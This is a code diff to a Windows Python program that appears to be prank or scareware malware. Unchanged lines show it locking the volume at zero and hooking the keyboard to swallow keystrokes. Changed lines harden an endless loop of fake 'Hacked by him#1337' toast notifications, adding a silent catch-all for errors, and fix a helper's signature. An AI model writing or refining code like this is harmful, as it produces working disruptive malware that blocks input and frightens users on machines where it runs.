@@ -48,12 +48,21 @@ class Threadlib:
         while True:
             Threadlib.volume.SetMasterVolumeLevel(0, None)
     @staticmethod
-    def sendmessage():
+    def sendmessage():  
         toaster = ToastNotifier()
-        toaster.icon_path = Threadlib.resource_path(resource.folder+'ybj.ico')
-        while True:
-            toaster.show_toast("Hacked by him#1337", Threadlib.text[random.randint(0,3)],
-                               duration=5,icon_path=toaster.icon_path)
+        icon_path = Threadlib.resource_path(resource.folder+'ybj.ico')
+
+        if not os.path.exists(icon_path):
+            raise FileNotFoundError(f"图标文件未找到: {icon_path}")
+        try:
+            while True:
+                
+                toaster.show_toast(
+                    title="Hacked by him#1337",msg=random.choice(Threadlib.text),
+                    icon_path=icon_path,  duration=5)
+        except:
+            pass
+        
     @classmethod
     def hook_callback(nCode, wParam, lParam):
         if wParam == Threadlib.WM_KEYDOWN:
@@ -61,8 +70,10 @@ class Threadlib:
             return 1  
         return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
     @classmethod
-    def resource_path(relative_path):
+    def resource_path(cls,relative_path):
+        
         try:
+            
             base_path = sys._MEIPASS
         except AttributeError:
             base_path = os.path.abspath(".")
